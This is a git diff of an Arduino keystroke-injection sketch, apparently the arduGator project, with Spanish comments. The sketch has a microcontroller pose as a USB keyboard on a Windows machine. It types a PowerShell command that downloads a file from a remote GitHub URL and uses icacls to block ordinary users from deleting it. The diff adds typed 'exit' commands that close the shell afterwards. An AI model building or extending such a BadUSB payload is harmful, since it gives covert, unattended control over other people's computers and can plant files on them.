@@ -1,8 +1,7 @@
 #include <Keyboard.h>
 
 
-#define DELAY_MULT 20
-
+#define DELAY_MULT 30
 
 // Keyboard.h tiene problemas entendiendo otros layouts
 // Es necesario presionar shift y la tecla para llegar a ciertos caracteres
@@ -141,6 +140,16 @@ void setup() {
   Keyboard.release(KEY_RETURN);
   delay(DELAY_MULT);
   printString("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/germanquero/arduGator/refs/heads/main/testing.txt\" -OutFile \".\\testing.txt\"; icacls \".\\testing.txt\" /inheritance:r /grant:r \"Administradores:F\" /deny \"Usuarios:(DE,DC)\"");
+  Keyboard.press(KEY_RETURN);
+  delay(DELAY_MULT);
+  Keyboard.release(KEY_RETURN);
+  delay(DELAY_MULT);
+  printString("exit");
+  Keyboard.press(KEY_RETURN);
+  delay(DELAY_MULT);
+  Keyboard.release(KEY_RETURN);
+  delay(DELAY_MULT);
+  printString("exit");
 
   // ---
   // todo:
